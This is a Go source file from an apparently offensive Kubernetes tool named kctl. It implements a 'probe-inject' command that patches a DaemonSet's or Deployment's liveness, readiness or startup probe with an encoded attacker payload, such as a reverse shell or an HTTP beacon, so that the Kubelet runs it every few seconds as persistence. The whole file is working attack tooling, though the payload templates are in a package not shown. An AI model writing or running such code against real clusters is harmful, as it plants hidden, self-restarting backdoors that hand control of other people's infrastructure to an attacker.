package persist

import (
	"context"
	"fmt"
	"strconv"
	"strings"

	"kctl/config"
	"kctl/internal/client"
	"kctl/internal/client/k8s"
	"kctl/internal/persist"
	"kctl/internal/session"
	"kctl/pkg/types"
	"kctl/utils/Ask"
)

// ProbeInjectCmd probe-inject 子命令
type ProbeInjectCmd struct{}

func init() {
	Register(&ProbeInjectCmd{})
}

func (c *ProbeInjectCmd) Name() string        { return "probe-inject" }
func (c *ProbeInjectCmd) Aliases() []string   { return []string{"pi", "inject"} }
func (c *ProbeInjectCmd) Description() string { return "通过探针注入实现持久化" }

func (c *ProbeInjectCmd) Usage() string {
	return `persist probe-inject [选项]

通过注入 Kubernetes 探针实现持久化

此命令会将恶意命令注入到工作负载的探针中，利用 Kubelet 定期执行探针的特性
实现持久化执行。

支持的工作负载类型:
  - DaemonSet: 运行在所有节点上，适合全集群持久化
  - Deployment: 运行指定副本数，适合特定服务持久化

工作原理:
  1. 选择工作负载类型 (DaemonSet/Deployment)
  2. 选择目标工作负载
  3. 检测容器中可用的工具 (sh, bash, curl, nc 等)
  4. 选择载荷类型 (反向 Shell, HTTP 信标, 自定义命令)
  5. 选择探针类型 (liveness, readiness, startup)
  6. 注入探针

可选选项:
  --namespace, -n   目标命名空间 (默认: 所有命名空间)
  --type, -t        工作负载类型 (daemonset/deployment，默认: 交互选择)
  --dry-run         仅预览，不实际执行
  --server          API Server URL
  --token           认证 Token

示例:
  persist probe-inject                         # 交互式注入
  persist probe-inject -n kube-system          # 只在 kube-system 命名空间中选择
  persist probe-inject -t deployment           # 只选择 Deployment
  persist probe-inject --dry-run               # 仅预览 Patch 内容`
}

func (c *ProbeInjectCmd) Execute(sess *session.Session, args []string) error {
	p := sess.Printer
	ctx := context.Background()

	// 检查是否请求帮助
	for _, arg := range args {
		if arg == "--help" || arg == "-h" {
			p.Println(c.Usage())
			return nil
		}
	}

	// 解析参数
	opts, err := c.parseArgs(sess, args)
	if err != nil {
		return err
	}

	// 创建 K8s 客户端
	k8sClient, err := createK8sClient(sess, opts.ServerURL, opts.Token)
	if err != nil {
		return err
	}

	// Step 1: 选择工作负载类型
	var workloadType types.WorkloadType
	if opts.WorkloadType != "" {
		workloadType = types.WorkloadType(opts.WorkloadType)
	} else {
		typeOptions := []Ask.SelectOption{
			{Label: "DaemonSet", Value: "DaemonSet", Description: "运行在所有节点上"},
			{Label: "Deployment", Value: "Deployment", Description: "运行指定副本数"},
		}
		selectedType, err := Ask.SelectOne("选择工作负载类型:", typeOptions)
		if err != nil {
			return fmt.Errorf("选择工作负载类型失败: %w", err)
		}
		workloadType = types.WorkloadType(selectedType)
	}

	// Step 2: 根据类型列出并选择工作负载
	var (
		workloadName      string
		workloadNamespace string
		containerName     string
		containers        []string
		labels            map[string]string
		hasLiveness       bool
		hasReadiness      bool
		hasStartup        bool
	)

	switch workloadType {
	case types.WorkloadTypeDaemonSet:
		p.Printf("%s Scanning DaemonSets...\n", p.Colored(config.ColorBlue, "[*]"))
		daemonSets, err := k8sClient.ListDaemonSets(ctx, opts.Namespace)
		if err != nil {
			return fmt.Errorf("列出 DaemonSet 失败: %w", err)
		}
		if len(daemonSets) == 0 {
			return fmt.Errorf("未找到 DaemonSet")
		}
		p.Printf("%s Found %d DaemonSet(s)\n", p.Colored(config.ColorGreen, "[+]"), len(daemonSets))

		dsOptions := make([]Ask.SelectOption, len(daemonSets))
		for i, ds := range daemonSets {
			dsOptions[i] = Ask.SelectOption{
				Label:       fmt.Sprintf("%s/%s", ds.Namespace, ds.Name),
				Value:       fmt.Sprintf("%d", i),
				Description: fmt.Sprintf("Ready: %d/%d", ds.ReadyReplicas, ds.DesiredReplicas),
			}
		}
		selectedIdx, err := Ask.SelectOne("选择目标 DaemonSet:", dsOptions)
		if err != nil {
			return fmt.Errorf("选择 DaemonSet 失败: %w", err)
		}
		idx, _ := strconv.Atoi(selectedIdx)
		selected := daemonSets[idx]
		workloadName = selected.Name
		workloadNamespace = selected.Namespace
		labels = selected.Labels
		hasLiveness = selected.HasLivenessProbe
		hasReadiness = selected.HasReadinessProbe
		hasStartup = selected.HasStartupProbe
		for _, c := range selected.Containers {
			containers = append(containers, c.Name)
		}

	case types.WorkloadTypeDeployment:
		p.Printf("%s Scanning Deployments...\n", p.Colored(config.ColorBlue, "[*]"))
		deployments, err := k8sClient.ListDeployments(ctx, opts.Namespace)
		if err != nil {
			return fmt.Errorf("列出 Deployment 失败: %w", err)
		}
		if len(deployments) == 0 {
			return fmt.Errorf("未找到 Deployment")
		}
		p.Printf("%s Found %d Deployment(s)\n", p.Colored(config.ColorGreen, "[+]"), len(deployments))

		deployOptions := make([]Ask.SelectOption, len(deployments))
		for i, deploy := range deployments {
			deployOptions[i] = Ask.SelectOption{
				Label:       fmt.Sprintf("%s/%s", deploy.Namespace, deploy.Name),
				Value:       fmt.Sprintf("%d", i),
				Description: fmt.Sprintf("Ready: %d/%d", deploy.ReadyReplicas, deploy.Replicas),
			}
		}
		selectedIdx, err := Ask.SelectOne("选择目标 Deployment:", deployOptions)
		if err != nil {
			return fmt.Errorf("选择 Deployment 失败: %w", err)
		}
		idx, _ := strconv.Atoi(selectedIdx)
		selected := deployments[idx]
		workloadName = selected.Name
		workloadNamespace = selected.Namespace
		labels = selected.Selector
		hasLiveness = selected.HasLivenessProbe
		hasReadiness = selected.HasReadinessProbe
		hasStartup = selected.HasStartupProbe
		for _, c := range selected.Containers {
			containers = append(containers, c.Name)
		}

	default:
		return fmt.Errorf("不支持的工作负载类型: %s", workloadType)
	}

	p.Printf("%s Selected: %s/%s\n", p.Colored(config.ColorGreen, "[+]"), workloadNamespace, workloadName)

	// Step 3: 选择容器
	if len(containers) == 0 {
		return fmt.Errorf("工作负载没有容器")
	}
	if len(containers) == 1 {
		containerName = containers[0]
		p.Printf("%s Using container: %s\n", p.Colored(config.ColorBlue, "[*]"), containerName)
	} else {
		containerOptions := make([]Ask.SelectOption, len(containers))
		for i, c := range containers {
			containerOptions[i] = Ask.SelectOption{
				Label: c,
				Value: c,
			}
		}
		containerName, err = Ask.SelectOne("选择目标容器:", containerOptions)
		if err != nil {
			return fmt.Errorf("选择容器失败: %w", err)
		}
	}

	// Step 4: 获取一个 Pod 用于工具检测
	p.Printf("%s Finding a running Pod for tool detection...\n", p.Colored(config.ColorBlue, "[*]"))
	var labelSelector string
	if labels != nil {
		var labelPairs []string
		for k, v := range labels {
			labelPairs = append(labelPairs, fmt.Sprintf("%s=%s", k, v))
		}
		labelSelector = strings.Join(labelPairs, ",")
	}

	pods, err := k8sClient.ListPods(ctx, workloadNamespace, labelSelector)
	if err != nil {
		return fmt.Errorf("列出 Pod 失败: %w", err)
	}

	var targetPod *k8s.PodInfo
	for i := range pods {
		if pods[i].Status == "Running" {
			targetPod = &pods[i]
			break
		}
	}
	if targetPod == nil {
		return fmt.Errorf("未找到 Running 状态的 Pod")
	}
	p.Printf("%s Using Pod: %s for tool detection\n", p.Colored(config.ColorGreen, "[+]"), targetPod.Name)

	// Step 5: 检测工具
	p.Printf("%s Detecting available tools...\n", p.Colored(config.ColorBlue, "[*]"))
	toolResults, err := persist.DetectToolsQuick(ctx, k8sClient, targetPod.Namespace, targetPod.Name, containerName)
	if err != nil {
		return fmt.Errorf("工具检测失败: %w", err)
	}

	availableTools := persist.GetAvailableTools(toolResults)
	if len(availableTools) == 0 {
		return fmt.Errorf("未检测到任何可用工具")
	}
	p.Printf("%s Available tools: %s\n", p.Colored(config.ColorGreen, "[+]"), strings.Join(availableTools, ", "))

	if !persist.HasShell(toolResults) {
		return fmt.Errorf("未检测到可用的 shell (sh/bash/ash/zsh)")
	}
	if !persist.HasBase64(toolResults) {
		p.Warning("未检测到 base64 工具，载荷将不会被编码")
	}

	// Step 6: 选择载荷
	availablePayloads := persist.GetAvailablePayloads(toolResults)
	if len(availablePayloads) == 0 {
		return fmt.Errorf("没有可用的载荷类型")
	}

	payloadOptions := make([]Ask.SelectOption, len(availablePayloads))
	for i, pl := range availablePayloads {
		payloadOptions[i] = Ask.SelectOption{
			Label:       pl.Name,
			Value:       string(pl.Type),
			Description: pl.Description,
		}
	}
	selectedPayloadType, err := Ask.SelectOne("选择载荷类型:", payloadOptions)
	if err != nil {
		return fmt.Errorf("选择载荷失败: %w", err)
	}

	template := persist.GetPayloadTemplate(types.PayloadType(selectedPayloadType))

	// Step 7: 输入载荷参数
	params := make(map[string]string)
	for _, param := range template.Parameters {
		prompt := param.Description
		if param.Default != "" {
			prompt += fmt.Sprintf(" (默认: %s)", param.Default)
		}
		var value string
		if param.Required {
			value, err = Ask.InputRequired(prompt+":", param.Default)
		} else {
			value, err = Ask.Input(prompt+":", param.Default)
		}
		if err != nil {
			return fmt.Errorf("输入参数失败: %w", err)
		}
		params[param.Name] = value
	}

	payload, err := persist.BuildPayload(template, params)
	if err != nil {
		return fmt.Errorf("构建载荷失败: %w", err)
	}
	p.Printf("%s Payload: %s\n", p.Colored(config.ColorBlue, "[*]"), payload)

	// Step 8: 选择探针类型
	var availableProbeTypes []types.ProbeType
	if !hasLiveness {
		availableProbeTypes = append(availableProbeTypes, types.ProbeTypeLiveness)
	}
	if !hasReadiness {
		availableProbeTypes = append(availableProbeTypes, types.ProbeTypeReadiness)
	}
	if !hasStartup {
		availableProbeTypes = append(availableProbeTypes, types.ProbeTypeStartup)
	}
	if len(availableProbeTypes) == 0 {
		return fmt.Errorf("所有探针类型都已被使用，无法注入")
	}

	probeOptions := make([]Ask.SelectOption, len(availableProbeTypes))
	for i, pt := range availableProbeTypes {
		probeOptions[i] = Ask.SelectOption{
			Label:       string(pt),
			Value:       string(pt),
			Description: persist.ProbeTypeDescription(pt),
		}
	}
	selectedProbeType, err := Ask.SelectOne("选择探针类型:", probeOptions)
	if err != nil {
		return fmt.Errorf("选择探针类型失败: %w", err)
	}
	probeType := types.ProbeType(selectedProbeType)

	// Step 9: 配置探针参数
	periodStr, _ := Ask.InputInt("执行间隔 (秒):", "30")
	periodSeconds, _ := parseInt32(periodStr, 30)

	initialDelayStr, _ := Ask.InputInt("初始延迟 (秒):", "10")
	initialDelaySeconds, _ := parseInt32(initialDelayStr, 10)

	timeoutStr, _ := Ask.InputInt("超时时间 (秒):", "5")
	timeoutSeconds, _ := parseInt32(timeoutStr, 5)

	// Step 10: 构建探针命令
	shell := persist.GetPreferredShell(toolResults)
	hasBase64 := persist.HasBase64(toolResults)
	probeCommand := persist.BuildProbeCommand(payload, shell, hasBase64)

	probeConfig := &types.ProbeConfig{
		Type:                probeType,
		Command:             probeCommand,
		PeriodSeconds:       periodSeconds,
		InitialDelaySeconds: initialDelaySeconds,
		TimeoutSeconds:      timeoutSeconds,
		FailureThreshold:    3,
		SuccessThreshold:    1,
	}

	// Step 11: 构建 Patch
	patch, err := persist.BuildProbePatch(containerName, probeType, probeConfig)
	if err != nil {
		return fmt.Errorf("构建 Patch 失败: %w", err)
	}

	// 显示预览
	p.Println()
	p.Println(persist.FormatPatchPreview(patch, workloadName, workloadNamespace, containerName, probeType))

	if opts.DryRun {
		p.Printf("%s Dry run mode - no changes applied\n", p.Colored(config.ColorYellow, "[!]"))
		return nil
	}

	// Step 12: 确认并执行
	if !Ask.ForSure("确认注入探针?") {
		p.Printf("%s Operation cancelled\n", p.Colored(config.ColorYellow, "[!]"))
		return nil
	}

	p.Printf("%s Injecting probe...\n", p.Colored(config.ColorBlue, "[*]"))

	switch workloadType {
	case types.WorkloadTypeDaemonSet:
		err = k8sClient.PatchDaemonSet(ctx, workloadNamespace, workloadName, patch)
	case types.WorkloadTypeDeployment:
		err = k8sClient.PatchDeployment(ctx, workloadNamespace, workloadName, patch)
	}
	if err != nil {
		return fmt.Errorf("注入探针失败: %w", err)
	}

	p.Printf("%s Probe injected successfully!\n", p.Colored(config.ColorGreen, "[+]"))
	p.Println()
	p.Printf("%s The %s will restart its Pods automatically.\n", p.Colored(config.ColorBlue, "[*]"), workloadType)
	p.Printf("%s Payload will execute every %d seconds.\n", p.Colored(config.ColorBlue, "[*]"), periodSeconds)

	// 显示清理命令
	p.Println()
	p.Printf("%s To remove the injected probe, use:\n", p.Colored(config.ColorYellow, "[!]"))
	p.Printf("  persist probe-restore -t %s -n %s --name %s\n", strings.ToLower(string(workloadType)), workloadNamespace, workloadName)

	return nil
}

func (c *ProbeInjectCmd) parseArgs(sess *session.Session, args []string) (*probeInjectOptions, error) {
	opts := &probeInjectOptions{}

	for i := 0; i < len(args); i++ {
		arg := args[i]
		switch arg {
		case "--namespace", "-n":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--namespace 需要参数")
			}
			i++
			opts.Namespace = args[i]
		case "--type", "-t":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--type 需要参数")
			}
			i++
			t := strings.ToLower(args[i])
			switch t {
			case "daemonset", "ds":
				opts.WorkloadType = string(types.WorkloadTypeDaemonSet)
			case "deployment", "deploy":
				opts.WorkloadType = string(types.WorkloadTypeDeployment)
			default:
				return nil, fmt.Errorf("不支持的工作负载类型: %s (可选: daemonset, deployment)", args[i])
			}
		case "--server":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--server 需要参数")
			}
			i++
			opts.ServerURL = args[i]
		case "--token":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--token 需要参数")
			}
			i++
			opts.Token = args[i]
		case "--dry-run":
			opts.DryRun = true
		default:
			if strings.HasPrefix(arg, "-") {
				return nil, fmt.Errorf("未知选项: %s", arg)
			}
		}
	}
	return opts, nil
}

// probeInjectOptions 命令选项
type probeInjectOptions struct {
	Namespace    string
	WorkloadType string
	ServerURL    string
	Token        string
	DryRun       bool
}

// parseInt32 解析 int32
func parseInt32(s string, defaultVal int32) (int32, error) {
	if s == "" {
		return defaultVal, nil
	}
	v, err := strconv.ParseInt(s, 10, 32)
	if err != nil {
		return defaultVal, err
	}
	return int32(v), nil
}

// createK8sClient 创建 K8s 客户端
func createK8sClient(sess *session.Session, serverURL, token string) (k8s.Client, error) {
	apiServer := BuildAPIServerURL(sess.Config.APIServer, sess.Config.APIServerPort)
	if serverURL != "" {
		apiServer = serverURL
	}
	if token == "" {
		token = sess.Config.Token
	}

	if apiServer == "" {
		return nil, fmt.Errorf("未配置 API Server，请使用 'set api-server <url>' 设置或使用 'set kubeconfig <path>'")
	}

	hasToken := token != ""
	hasClientCert := len(sess.Config.ClientCert) > 0 && len(sess.Config.ClientKey) > 0

	if !hasToken && !hasClientCert {
		return nil, fmt.Errorf("未配置认证信息，请使用 'set token <token>' 或 'set kubeconfig <path>' 设置")
	}

	cfg := client.DefaultConfig()
	if sess.Config.ProxyURL != "" {
		cfg.WithProxy(sess.Config.ProxyURL)
	}
	if hasClientCert {
		cfg.WithClientCert(sess.Config.ClientCert, sess.Config.ClientKey)
		if len(sess.Config.CACert) > 0 {
			cfg.WithCACert(sess.Config.CACert)
		}
	}

	return k8s.NewClient(apiServer, token, cfg)
}
